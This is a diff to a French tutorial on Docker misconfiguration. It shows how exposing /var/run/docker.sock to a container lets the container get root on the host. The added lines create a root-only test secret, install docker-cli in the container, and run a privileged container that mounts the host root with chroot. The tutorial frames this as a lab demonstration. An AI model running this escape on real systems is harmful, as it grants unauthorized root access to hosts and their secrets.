@@ -13,8 +13,21 @@ En **production**, mal configurer un conteneur **peut exposer l’hôte** à des
 
 ---
 
+
+
 ## **2️⃣ Conteneur dangereux qui peut obtenir un accès root à l'hôte**
 🚨 **Ne testez cela que sur une machine de test** 🚨
+### **Prépation**
+
+Créer un fichier secret
+```sh
+ echo "Supersecret" > secret.txt
+ sudo chown root secret.txt 
+ sudo chmod 400 secret.txt
+ sudo mv secret.txt /etc/secret.txt
+ cat /etc/secret.txt 
+```
+
 
 ### **📌 Exemple : Accès root à l’hôte via `/var/run/docker.sock`**
 1️⃣ **Lancer un conteneur en **mode privilégié** et en exposant le socket Docker** :
@@ -26,6 +39,7 @@ docker run -it --rm \
 ```
 2️⃣ **Dans le conteneur, créer un nouveau conteneur root privilégié** :
 ```sh
+apk add docker-cli
 docker run -it --rm --privileged --net=host --pid=host -v /:/mnt alpine chroot /mnt sh
 ```
 📌 **Résultat attendu** :  
